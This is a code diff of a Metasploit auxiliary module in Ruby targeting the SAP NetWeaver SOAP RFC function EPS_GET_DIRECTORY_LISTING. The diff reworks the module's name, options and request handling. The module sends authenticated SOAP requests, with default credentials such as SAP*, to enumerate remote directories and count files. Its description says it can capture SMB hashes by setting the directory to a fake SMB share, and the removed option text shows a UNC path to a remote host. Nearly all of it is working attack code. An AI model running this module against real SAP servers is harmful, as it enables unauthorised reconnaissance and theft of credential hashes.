@@ -31,21 +31,31 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'EPS_GET_DIRECTORY_LISTING (list directory + SMB Relay)',
+			'Name' => 'SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure',
 			'Description' => %q{
-								A vulnerability in the SAP EPS RFC function group allows an attacker to execute an SMB relay attack.
-								},
-			'References' => [['URL','http://labs.mwrinfosecurity.com']],
-			'Author' => ['nmonkee'],
+					This module abuses the SAP NetWeaver EPS_GET_DIRECTORY_LISTING function, on the
+				SAP SOAP RFC Service, to check for remote directory existence and get the number
+				of entries on it. The module can also be used to capture SMB hashes by using a fake
+				SMB share as DIR.
+			},
+			'References' =>
+				[
+					[ 'URL', 'http://labs.mwrinfosecurity.com' ]
+				],
+			'Author' =>
+				[
+					'nmonkee'
+				],
 			'License' => MSF_LICENSE
-			)
+		)
 
 		register_options([
-			OptString.new('CLIENT', [true, 'SAP client', nil]),
-			OptString.new('USER', [true, 'Username', nil]),
-			OptString.new('PASS', [true, 'Password', nil]),
-			OptString.new('PATH',[true,'File path (e.g. \\\\xx.xx.xx.xx\\share)',nil])
-			], self.class)
+			Opt::RPORT(8000),
+			OptString.new('CLIENT', [true, 'SAP Client', '001']),
+			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+			OptString.new('PASSWORD', [true, 'Password', '06071992']),
+			OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
+		], self.class)
 	end
 
 	def run_host(ip)
@@ -56,32 +66,38 @@ class Metasploit4 < Msf::Auxiliary
 		data << '<SOAP-ENV:Header/>'
 		data << '<SOAP-ENV:Body>'
 		data << '<EPS_GET_DIRECTORY_LISTING xmlns="urn:sap-com:document:sap:rfc:functions">'
-		data << '<DIR_NAME>' + datastore['PATH'] + '</DIR_NAME>'
+		data << '<DIR_NAME>' + datastore['DIR'] + '</DIR_NAME>'
 		data << '</EPS_GET_DIRECTORY_LISTING>'
 		data << '</SOAP-ENV:Body>'
 		data << '</SOAP-ENV:Envelope>'
 
-		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
 		begin
-			print_status("[SAP] #{ip}:#{rport} - sending request for #{datastore['PATH']}")
-			res = send_request_raw({
-				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+			vprint_status("#{rhost}:#{rport} - Sending request to check #{datastore['DIR']}")
+			res = send_request_cgi({
+				'uri' => '/sap/bc/soap/rfc',
 				'method' => 'POST',
 				'data' => data,
-				'headers' =>{
-					'Content-Length' => data.size.to_s,
+				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+				'ctype' => 'text/xml; charset=UTF-8',
+				'headers' => {
 					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-					'Authorization' => 'Basic ' + user_pass,
-					'Content-Type' => 'text/xml; charset=UTF-8',}
-					}, 45)
-			if res
-				vprint_error("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
+				},
+				'vars_get' => {
+					'sap-client' => datastore['CLIENT'],
+					'sap-language' => 'EN'
+				}
+			})
+			if res and res.code == 200 and res.body =~ /EPS_GET_DIRECTORY_LISTING\.Response/ and res.body =~ /<FILE_COUNTER>(\d*)<\/FILE_COUNTER>/
+				file_count = $1
+				print_good("#{rport}:#{rhost} - #{file_count} files under #{datastore["DIR"]}")
+			else
+				vprint_error("#{rhost}:#{rport} - Error code: " + res.code.to_s) if res
+				vprint_error("#{rhost}:#{rport} - Error message: " + res.message.to_s) if res
+				vprint_error("#{rhost}:#{rport} - Error body: " + res.body.to_s) if res and res.body
 			end
 			rescue ::Rex::ConnectionError
-				print_error("#{rhost}:#{rport} - Unable to connect")
+				vprint_error("#{rhost}:#{rport} - Unable to connect")
 				return
 			end
 		end
